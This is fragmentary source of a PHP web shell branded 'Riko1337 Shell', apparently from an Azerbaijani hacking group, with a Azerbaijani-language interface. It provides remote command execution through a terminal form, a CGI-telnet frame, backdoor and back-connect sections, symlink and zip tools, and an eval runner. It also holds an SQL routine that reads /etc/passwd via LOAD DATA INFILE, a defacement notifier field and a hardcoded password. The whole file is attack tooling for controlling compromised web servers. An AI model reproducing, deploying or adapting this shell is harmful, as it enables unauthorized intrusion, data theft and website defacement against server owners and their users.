...
<html>
    <head>
        ...
        <link href="https://2.bp.blogspot.com/-2PCtVVRWEZ0/W2oYRV_3EaI/AAAAAAAABYE/eZYtYP6fWIMlsqOM_ghxK2vFXREbBBO3QCLcBGAs/s1600/10531456493956963776.jpeg" rel="icon" type="image/x-icon"/>
        <title><?php echo $_SERVER['HTTP_HOST']; ?> - Riko1337 Shell</title>
        <meta content='#070709' name='theme-color'/>
        <meta content='#070709' name='msapplication-navbutton-color'/>
        <meta content='yes' name='apple-mobile-web-app-capable'/>
        <meta content='#070709' name='apple-mobile-web-app-status-bar-style'/>
<style>
body
{
    background:#070709;
...
body {
  background: url(https://2.bp.blogspot.com/--bksY565KjU/W2n6iWiGl-I/AAAAAAAABXM/levaQoNMPBQIcF0sdVAtV-8RD5gaeGGIgCLcBGAs/s1600/Hi-Tech-Wallpaper-12.jpg) center center fixed;
...
.logout
{
    ...
    background:#990000;
    color:#FFF;
    background-image:url('https://2.bp.blogspot.com/-2PCtVVRWEZ0/W2oYRV_3EaI/AAAAAAAABYE/eZYtYP6fWIMlsqOM_ghxK2vFXREbBBO3QCLcBGAs/s1600/10531456493956963776.jpeg');
    padding:5px;
    padding-left:20px;
...
.menu ul li
{
    border-top: 3px solid #710001;
    background-color:#800000;
    text-align:center;
    float:left;
    border-right:3px solid #710001;
    padding:10px 0px;
    width:8%;
    font-size:12px;
...
::-webkit-scrollbar{width:15px;}::-webkit-scrollbar-track{background-color:#000;}::-webkit-scrollbar-thumb{background-color:#800000;}::-webkit-scrollbar-thumb:hover{background-color:#800000;}
</style>
    ...
    <body>
        <div class="main">
            <div class="header">
    <h1>Riko1337 Shell<span style="font-size: 12px; color: #800000;"> Powered By Riko1337</span></h1>
    <img class="logo" src="https://2.bp.blogspot.com/-2PCtVVRWEZ0/W2oYRV_3EaI/AAAAAAAABYE/eZYtYP6fWIMlsqOM_ghxK2vFXREbBBO3QCLcBGAs/s1600/10531456493956963776.jpeg" width="300" height="300" />
...
<td colspan="2"><span>'.$cwd_links.' <a href="?action=explorer&dir='.$GLOBALS['home_path'].'"><font color=#800000 >| Home Directory |</font></a></span></td>
</tr>';
        ?><br />
...
<div class="menu">
        <ul>
            ...
            <li id="cgiriko01337"><a href="?action=cgiriko01337&dir=<?php echo $path ?>">CGI-TELNET</a></li>
...
if(isset($_GET['action'])){
    ...
    function scandir($dir) {
        ...
        echo "<style>#explorer{background: #710001}</style>";
		?>
        <br />
        <div class="explorer">
        <?php
...
.dir {color:#070709;border: 1px solid #800000; padding:6px 6px 6px 6px;}
</style>
";
}
...
echo '<a name="down"></a><br><span>View File:</span><pre style="border:2px solid #800000;padding:5px;margin:0;overflow: auto;background:whitesmoke;color:black">';
...
if( @is_readable($_GET['file']) ) {
                echo '<a name="down"></a><br><span>View File:</span><pre style="border:2px solid #800000;padding:5px;margin:0;overflow: auto;background:whitesmoke;">';
...
<span>Notifier: </span><input name="defacer" size="67" id="text" value="riko01337 Digital Security Team" type="text"><br />
...
<input type='submit' name='submit' value='>>' />
        ...
        if(is_array($server))
            $server = $server[0];
        echo '<pre style="border:2px solid #800000;padding:5px;margin:0;overflow: auto;"><br/>';
	...
	if($action=="backdoor"){
        echo "<style>#backdoor{background: #710001}</style>";
...
?>
                  <?php
				          ...
				          echo '<br><pre style="border:2px solid #800000;padding:5px;margin:0;overflow: auto;">';
            ...
            while ($i < 60000) {
                ...
                if (!empty($line)) {
                    while (list ($key, $vl) = each($line)){
                        echo $vl."\n";
                        break;}}$i++;}
        }else{echo '<pre style="border:2px solid #800000;padding:5px;margin:0;overflow: auto;"><br>';
...
echo str_replace('<h1','<h2', $tmp) .'</div><br>';
	...
	if($action=="aboutus"){
echo "<style>#aboutus{background: #710001}</style>";

		?>
        <br />
                    <center>
        <img src="https://3.bp.blogspot.com/-ipzHTVhQVsc/W2oAkUbI-eI/AAAAAAAABXk/Ip7HcCd0E_AZoVxG3a8lQoqeJbukx16WwCLcBGAs/s1600/cropped_3791571135adc83693232c5.04321126.png" width="550" height="199" /><br />
   		<span style="color:#800000;font-size:20px">Riko1337 Shell</span><br />
                        <span style="font-size:19px">Powered By <a target="_blank" href="http://az-cyber.org/">Riko1337</a></span><br />

        <span>Salamlayıram  : Riko1337, Ramil Feyziyev.</span><br />
        <span>Bizim Məkan: <a href="http://az-cyber.org/" target="_blank">Az-Cyber</a><br />
        <span><br>Azerbaijan Coders Team</span><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br />
                    </center>
        <?php
	}
	if($action=="rmshell"){
        echo "<style>#rmshell{background: #710001}</style>";

        ?>
        
        <form action="?action=rmshell" method="post">
        <span>Siz Həqiqətən Shell'i Silmək İstəyirsiniz?</span>
...
<td><input name="pass" size="30" value="riko01337" disabled /></td></tr>
<tr><td><Admin Email:</td>
<td><input name="email" size="30" value="az3ricoder@gmail.com"></td></tr>
</table>
...
<input value="Change" name="submit" type="submit">
	...
	if($action=="sql"){
        echo "<style>#sql{background: #710001}</style>";
							...
							$db = $_GET['db'];
                                ...
                                if(isset($_GET['dump'])){
                                    backup_tables($sqlhost,$sqluser,$sqlpass,$db);
                   					...
                   					\nCREATE TABLE `riko01337 Digital Security Team` ( `file` LONGBLOB NOT NULL );
                   					\nLOAD DATA INFILE \"/etc/passwd\"\nINTO TABLE Mast3r_table;SELECT * FROM riko01337_table;
                   					\nDROP TABLE IF EXISTS riko01337_table;"; 
...
<form action="?action=terminal&CMD=shell#down" method="post"> 
		<table class="cmdbox"> 
			<tr>
				<td colspan="2"> 
                <a name="down"></a>
				<textarea style="width: 1000px; height: 400px;color: #FFF;background-color: #000;border: 2px solid #800000;font: 9pt Monospace,"Courier New";" class="output" readonly=""> $<?php if(isset($_POST['submitcmd'])) { echo htmlspecialchars($_POST['cmd'])."\n";}?><?php if(isset($_POST['submitcmd'])) { echo @exe($_POST['cmd']); } ?> </textarea>
				</td>
			</tr>
			<tr>
	...
	if($action=="basedir"){
        echo "<style>#basedir{background: #710001}</style>";
...
echo "<form method=get><span>Change Dir : <b><font color=\"#800000\">$user</font></b></span><br><input type='hidden' name='action' value='explorer'><input type=text name=dir value='$p4th'><input type=submit value='>>'></form><br>";
}
echo '<br><br></b>';
echo '</div>';
...
echo '<a name="down"></a><iframe src=cgiriko01337/cgi.riko01337 width=100% height=600px frameborder=0></iframe> ';
	...
	if($action=="sym"){
        echo "<style>#sym{background: #710001}</style>";
...
<font color="#FFFFFF"><b>Save Dir: </b></font><input type="text" name="zipfile" value="riko01337.zip" size="60"/><br /><br />
...
Save Dir: <input type="text" name="zipfile" value="az-cyber-Riko1337.zip" size="60"/><br /><br />
<input type="submit" value=">>" name="ziper" /> <br /><br />
</form></center>
';
if(isset($_POST['ziper']) && ($_POST['ziper'] == '>>'))
...
echo '</center></div>';
	...
	if($action=="bc"){
        echo "<style>#bc{background: #710001}</style>";
...
echo "</pre>";
     ...
     if($action=="othertools"){
         echo "<style>#othertools{background: #710001}</style>";
         ?>
		<table>
		<tr>
...
<input type="submit" value="Run !" name="submiteval" />
	...
	if($action=="logout"){
        ...
        <span>Sağol Brat Gedirsen ? Bele Tez [Riko1337]</span>
        <input type="submit" value="He" name="accept" style="cursor: pointer"/>
        <input type="button" value="Yox" onclick="window.location.href='?action=explorer'" style="cursor: pointer">
        </form>
